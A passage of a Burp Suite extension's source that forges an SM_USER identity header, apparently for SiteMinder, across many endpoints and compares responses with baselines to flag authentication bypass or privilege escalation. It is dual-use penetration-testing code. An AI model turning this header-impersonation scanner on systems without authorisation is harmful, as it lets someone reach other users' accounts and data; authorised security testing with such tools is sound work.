        if self.privesc_mode and self.custom_cookie:
            new_headers.append("Cookie: " + self.custom_cookie)
        if not replaced_target:
            new_headers.append("%s: %s" % (self.h_name, self.h_value))

        body_offset = info.getBodyOffset()
        body_bytes  = original_req[body_offset:]

        new_request = helpers.buildHttpMessage(new_headers, body_bytes)

        if self.delay_ms > 0:
            try:
                JThread.sleep(self.delay_ms)
            except:
                return

        if ext._cancel_flag.is_set():
            return

        try:
            resp_rr = ext._callbacks.makeHttpRequest(service, new_request)
        except:
            return

        response = resp_rr.getResponse()
        if response is None:
            return

        try:
            resp_info  = helpers.analyzeResponse(response)
            new_status = resp_info.getStatusCode()
        except:
            return

        # 1. skip codes -> silently dropped (login redirect etc.)
        if new_status in self.skip_codes:
            ext._skipped_counter.incrementAndGet()
            return

        # 2. not in working list -> counted only, no row / no file
        if new_status not in self.working_codes:
            ext._other_counter.incrementAndGet()
            return

        # 3. WORKING HIT -> export + table row + optional log line
        new_len = len(response)
        idx = ext._working_counter.incrementAndGet()
        diff = (new_len - orig_len) if orig_len is not None else None
        try:
            content_type = _classify_content_type(list(resp_info.getHeaders()))
        except:
            content_type = "NONE"

        # -------- baseline (the real "did SM_USER change anything?" test) --------
        # BYPASS mode : baseline = no cookies, no SM_USER (anonymous).
        # PRIVESC mode: baseline = your OWN cookies, no SM_USER  -- so if the
        #               modified response differs, SM_USER-swap actually moved
        #               the server to a different user's view. In privesc mode
        #               we send TWO identical baselines to establish the
        #               endpoint's natural noise floor for dynamic content
        #               (timestamps, tokens, etc.) -- this drives the false-
        #               positive rate to near-zero.
        anon_status    = None
        anon_response  = None
        anon_request   = None
        anon2_response = None
        anon2_status   = None
        verdict        = "N/A"
        if self.verify_baseline:
            anon_headers = []
            for h in original_headers:
                lower = h.lower()
                if lower.startswith("cookie:"):        continue
                if lower.startswith(target_prefix):    continue  # any existing SM_USER
                if self.strip_auth and lower.startswith("authorization:"):
                    continue
                anon_headers.append(h)
            if self.privesc_mode and self.custom_cookie:
                anon_headers.append("Cookie: " + self.custom_cookie)
            try:
                anon_request = helpers.buildHttpMessage(anon_headers, body_bytes)
            except:
                anon_request = None

            if anon_request is not None and not ext._cancel_flag.is_set():
                try:
                    anon_rr = ext._callbacks.makeHttpRequest(service, anon_request)
                    anon_response = anon_rr.getResponse()
                    if anon_response is not None:
                        anon_status = helpers.analyzeResponse(anon_response).getStatusCode()
                except:
                    anon_response = None

                # Second identical baseline for privesc mode -- gives us the
                # dynamic-content noise floor so we can compare cleanly.
                if (self.privesc_mode and anon_response is not None
                        and not ext._cancel_flag.is_set()):
                    try:
                        JThread.sleep(60)   # tiny gap so server produces fresh dynamic bits
                    except:
                        pass
                    if ext._cancel_flag.is_set():
                        pass
                    else:
                        try:
                            anon2_rr = ext._callbacks.makeHttpRequest(
                                service, anon_request)
                            anon2_response = anon2_rr.getResponse()
                            if anon2_response is not None:
                                anon2_status = helpers.analyzeResponse(
                                    anon2_response).getStatusCode()
                        except:
                            anon2_response = None

            # -------- verdict --------
            if self.privesc_mode:
                # Privesc mode -- zero-false-positive verdict via double baseline
                if anon_response is None or anon_status is None:
                    verdict = "N/A"
                elif anon_status in self.skip_codes or anon_status not in self.working_codes:
                    # Baseline (your session) failed -- unusual, but SM_USER
                    # got a 2xx. Real finding.
                    verdict = "BYPASS"
                elif anon2_response is None:
                    # Only one baseline succeeded -- fall back to conservative
                    # single-baseline compare (no noise floor available).
                    cmp = _compare_responses(anon_response, response, helpers)
                    verdict = "PUBLIC" if cmp == "SAME" else "BYPASS"
                else:
                    verdict = _privesc_verdict(
                        response, anon_response, anon2_response, helpers)
            else:
                # Bypass mode -- three-state verdict (Autorize-style).
                if anon_response is None or anon_status is None:
                    verdict = "N/A"
                elif anon_status in self.skip_codes or anon_status not in self.working_codes:
                    # Anon failed / got a redirect -- SM_USER granted access
                    # anon did not have.
                    verdict = "BYPASS"
                else:
                    cmp = _compare_responses(anon_response, response, helpers)
                    if cmp == "SAME":
                        verdict = "PUBLIC"
                    elif cmp == "MAYBE":
                        verdict = "MAYBE"
                    elif cmp == "DIFF":
                        verdict = "BYPASS"
                    else:
                        verdict = "N/A"

        vs_original = _compare_responses(orig_response, response, helpers)

        # Bump the per-verdict counter -- drives the coloured summary bar.
        counter = ext._verdict_counters.get(verdict)
        if counter is not None:
            counter.incrementAndGet()

        result = {
            "index"              : idx,
            "method"             : method,
            "url"                : url.toString(),
            "orig_status"        : orig_status,
            "anon_status"        : anon_status,
            "new_status"         : new_status,
            "new_length"         : new_len,
            "diff"               : diff,
            "content_type"       : content_type,
            "vs_original"        : vs_original,
            "verdict"            : verdict,
            "mode"               : "PRIVESC" if self.privesc_mode else "BYPASS",
            "new_request_bytes"  : new_request,
            "new_response_bytes" : response,
            "anon_request_bytes" : anon_request,
            "anon_response_bytes": anon_response,
            "exported_to"        : None,
        }

        if self.auto_save:
            ext._write_hit_file(result)

        # Retain bytes so double-clicking the row can render request +
        # response in a Burp dialog. Also store the anonymous baseline
        # bytes/status so the dialog can show the third view later.
        ext._add_hit_data(idx, service, new_request, response,
                          method, url.toString(), new_status, orig_status,
                          result.get("exported_to"),
                          anon_request, anon_response,
                          anon_status, verdict, result.get("mode"))
        # Drop bytes from the result dict -- they now live in _hits_data.
        result["new_request_bytes"]   = None
        result["new_response_bytes"]  = None
        result["anon_request_bytes"]  = None
        result["anon_response_bytes"] = None

        ext._record_hit(result)
        ext._refresh_summary_bar()
        if self.log_hits:
            mode_lbl = "PRIVESC" if self.privesc_mode else "BYPASS"
            ext._log("[+] HIT #%d [%s|%s] %s -> %d  %s"
                     % (idx, mode_lbl, verdict, method, new_status,
                        result["url"]))


class _SubmitAndWatch(JThread):
    """Background thread that submits all workers, then waits for completion.
    Keeps submission off the EDT so a 60k queue doesn't stall Burp's UI."""

    def __init__(self, ext, planned, h_name, h_value,
                 working_codes, skip_codes, strip_auth, delay_ms,
                 threads, log_hits, verify_baseline,
                 privesc_mode, custom_cookie, auto_save):
        JThread.__init__(self)
        self.ext             = ext
        self.planned         = planned
        self.h_name          = h_name
        self.h_value         = h_value
        self.working_codes   = working_codes
        self.skip_codes      = skip_codes
        self.strip_auth      = strip_auth
        self.delay_ms        = delay_ms
        self.threads         = threads
        self.log_hits        = log_hits
        self.verify_baseline = verify_baseline
        self.privesc_mode    = privesc_mode
        self.custom_cookie   = custom_cookie
        self.auto_save       = auto_save

    def run(self):
        ext = self.ext
        executor = Executors.newFixedThreadPool(self.threads)
        ext._executor = executor

        submitted = 0
        try:
            for it in self.planned:
                if ext._cancel_flag.is_set():
                    break
                worker = _RequestWorker(
                    ext, it, self.h_name, self.h_value,
                    self.working_codes, self.skip_codes,
                    self.strip_auth, self.delay_ms, self.log_hits,
                    self.verify_baseline,
                    self.privesc_mode, self.custom_cookie,
                    self.auto_save)
                try:
                    executor.execute(worker)
                    submitted += 1
                except:
                    break
        except:
            traceback.print_exc()

        # Release refs to the (potentially huge) planned list.
        self.planned = None

        ext._log("[.] Submitted %d workers, waiting for completion..." % submitted)

        try:
            executor.shutdown()
            while not executor.awaitTermination(1, TimeUnit.SECONDS):
                if ext._cancel_flag.is_set():
                    try:
                        executor.shutdownNow()
                    except:
                        pass
        except:
            traceback.print_exc()

        ext._update_progress(force=True)
        ext._finish_run()


class _TypeRowFilter(RowFilter):
    """Hides table rows whose Type / Verdict is not in the allowed sets."""
    TYPE_COL    = 6
    VERDICT_COL = 7

    def __init__(self, ext):
        self._ext = ext

    def include(self, entry):
        try:
            t = entry.getValue(_TypeRowFilter.TYPE_COL)
            if t is not None and str(t) not in self._ext._allowed_types():
                return False
            v = entry.getValue(_TypeRowFilter.VERDICT_COL)
            if v is not None and str(v) not in self._ext._allowed_verdicts():
                return False
            return True
        except:
            return True


class _FakeReqResp(IHttpRequestResponse):
    """Minimal IHttpRequestResponse used to feed URL-file items into the
    scanner. Response is None until makeHttpRequest fills it in later."""
    def __init__(self, service, request, response=None):
        self._service   = service
        self._request   = request
        self._response  = response
        self._comment   = None
        self._highlight = None
    def getRequest(self):        return self._request
    def setRequest(self, r):     self._request = r
    def getResponse(self):       return self._response
    def setResponse(self, r):    self._response = r
    def getHttpService(self):    return self._service
    def setHttpService(self, s): self._service = s
    def getComment(self):        return self._comment
    def setComment(self, c):     self._comment = c
    def getHighlight(self):      return self._highlight
    def setHighlight(self, h):   self._highlight = h


class _HitController(IMessageEditorController):
    """Feeds request/response bytes and the HttpService to a Burp
    IMessageEditor. With this, the editor's built-in right-click menu
    (Send to Repeater, Send to Intruder, Copy URL, etc.) works normally."""
    def __init__(self, service, request, response):
        self._service  = service
        self._request  = request
        self._response = response
    def getHttpService(self):  return self._service
    def getRequest(self):      return self._request
    def getResponse(self):     return self._response


class _TableRowAdapter(MouseAdapter):
    """Double-click a row -> open the Burp request/response dialog.
       Right-click     -> popup menu: View / Open .txt / Copy URL."""
    def __init__(self, ext):
        self._ext = ext

    def _selected_row_data(self, evt):
        table = self._ext._table
        row = table.rowAtPoint(evt.getPoint())
        if row < 0:
            return None
        # Make sure the row the user clicked becomes the selected one.
        if row != table.getSelectedRow():
            table.setRowSelectionInterval(row, row)
        model_row = table.convertRowIndexToModel(row)
        model = table.getModel()
        return {
            "idx" : model.getValueAt(model_row, 0),
            "url" : model.getValueAt(model_row, 2),
            "path": model.getValueAt(model_row, 12),
        }

    def mouseClicked(self, evt):
        if evt.getClickCount() != 2 or evt.isPopupTrigger():
            return
        try:
            info = self._selected_row_data(evt)
            if info and info["idx"] is not None:
                self._ext._show_hit_dialog(info["idx"])
        except:
            traceback.print_exc()

    def mousePressed(self, evt):
        if evt.isPopupTrigger():
            self._show_popup(evt)

    def mouseReleased(self, evt):
        if evt.isPopupTrigger():
            self._show_popup(evt)

    def _show_popup(self, evt):
        try:
            info = self._selected_row_data(evt)
            if not info:
                return
            ext = self._ext
            popup = JPopupMenu()

            view_item = JMenuItem("View request & response")
            view_item.addActionListener(ext._al(
                lambda ev, i=info["idx"]: ext._show_hit_dialog(i)))
            popup.add(view_item)

            open_item = JMenuItem("Open exported .txt")
            def _open(ev, p=info["path"]):
                if p:
                    try:
                        Desktop.getDesktop().open(File(p))
                    except:
                        traceback.print_exc()
            open_item.addActionListener(ext._al(_open))
            open_item.setEnabled(bool(info["path"]))
            popup.add(open_item)

            copy_item = JMenuItem("Copy URL")
            def _copy(ev, u=info["url"]):
                if u:
                    Toolkit.getDefaultToolkit().getSystemClipboard().setContents(
                        StringSelection(str(u)), None)
            copy_item.addActionListener(ext._al(_copy))
            popup.add(copy_item)

            popup.show(evt.getComponent(), evt.getX(), evt.getY())
        except:
            traceback.print_exc()
